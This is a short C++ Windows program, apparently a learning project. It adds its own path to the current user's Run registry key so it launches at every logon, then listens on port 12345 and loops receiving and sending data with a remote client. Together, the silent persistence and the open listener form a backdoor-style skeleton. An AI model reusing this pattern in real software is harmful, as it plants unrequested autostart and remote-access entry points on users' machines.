#include "client_manage_socket.h"
#include "server_main_socket.h"
#include <cstring>
#include "server_special_logic.h"
#pragma comment(lib, "Ws2_32.lib") 

#include "windows.h"
#include "change_registry.h"
#include "mutex_gaurd.h"
LPCSTR NAME_OF_VALUE_IN_REG = (LPCSTR) "socket_with_tecnic";
LPCSTR PATH_TO_PROGRAM = (LPCSTR) "C:\\Users\\astor\\Desktop\\c_learning\\Project9\\x64\\Release\\Project9.exe";
LPCSTR PATH_TO_KEY_TO_INSERT_IN = (LPCSTR) "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
LPSTR NAME_LOCK = (LPSTR) "very_special_lock";

int main()
{
    MutexGuard lock(NAME_LOCK);
    if (lock.getIsLockFree())
    {
        ManageRegistry run_key(PATH_TO_KEY_TO_INSERT_IN, HKEY_CURRENT_USER);
        if (!run_key.checkRegistryValue(NAME_OF_VALUE_IN_REG))
        {
            run_key.createRegistryValue(NAME_OF_VALUE_IN_REG, PATH_TO_PROGRAM);
        }

        char src_port[] = "12345";
        int received_len = 0;
        int* ptr_received_len = &received_len;

        char* recv_buffer = NULL;
        ServerSocket tech_server(src_port);
        tech_server.bindServer();
        tech_server.listenSocket();
        tech_server.acceptClient();
        ManageClient tech_other_computer(tech_server.getClientSocket());
        ServerLogic server(tech_other_computer);
        while (true)
        {
            recv_buffer = server.recvDataServer(ptr_received_len);
            server.sendDataServer(received_len, recv_buffer);
        }

    }
    return 0;
}

